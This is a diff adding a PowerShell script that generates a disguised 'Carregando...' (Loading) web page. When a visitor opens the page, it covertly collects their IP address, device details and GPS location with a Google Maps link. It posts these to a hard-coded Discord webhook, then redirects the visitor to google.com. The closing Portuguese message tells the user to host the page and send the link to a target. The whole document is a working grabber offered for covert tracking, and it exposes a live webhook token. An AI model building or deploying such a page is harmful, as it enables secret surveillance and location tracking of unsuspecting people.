@@ -1,0 +1,69 @@
+$discord_webhook_url = "https://discord.com/api/webhooks/1436833432939266072/bl1vSfi4Rujka3brxP4EdMWpqAmFmKqpLolMJMhEJnEXgNHe8X27h-2Ln-QUAyyZMb8a"
+$html_content = @"
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Carregando...</title>
+</head>
+<body>
+    <h1>Carregando...</h1>
+    <script>
+        const webhookUrl = "$discord_webhook_url";
+        
+        async function sendData() {
+            const data = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenResolution: screen.width + 'x' + screen.height,
+                timestamp: new Date().toLocaleString('pt-BR'),
+                ip: await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'N/A')
+            };
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    data.latitude = position.coords.latitude;
+                    data.longitude = position.coords.longitude;
+                    data.accuracy = position.coords.accuracy + 'm';
+                    data.mapsLink = 'https://www.google.com/maps?q=' + position.coords.latitude + ',' + position.coords.longitude;
+                    await sendToDiscord(data);
+                }, async () => {
+                    data.location = 'Negado';
+                    await sendToDiscord(data);
+                });
+            } else {
+                data.location = 'Nao suportado';
+                await sendToDiscord(data);
+            }
+        }
+        
+        async function sendToDiscord(data) {
+            const message = '**Dados capturados:**\n' +
+                '**IP:** ' + data.ip + '\n' +
+                '**Device:** ' + data.userAgent + '\n' +
+                '**Plataforma:** ' + data.platform + '\n' +
+                '**Idioma:** ' + data.language + '\n' +
+                '**Resolucao:** ' + data.screenResolution + '\n' +
+                '**Horario:** ' + data.timestamp + '\n' +
+                (data.latitude ? '**Localizacao:** ' + data.latitude + ', ' + data.longitude + '\n**Precisao:** ' + data.accuracy + '\n**Maps:** ' + data.mapsLink : '**Localizacao:** ' + data.location);
+            
+            await fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: message })
+            });
+            
+            window.location.href = 'https://www.google.com';
+        }
+        
+        sendData();
+    </script>
+</body>
+</html>
+"@
+$file_path = "$env:USERPROFILE\Desktop\capture.html"
+$html_content | Out-File -FilePath $file_path -Encoding UTF8
+Write-Host "Arquivo criado: $file_path"
+Write-Host "Agora voce precisa hospedar esse arquivo em algum lugar (GitHub Pages, Netlify, etc) e enviar o link!"
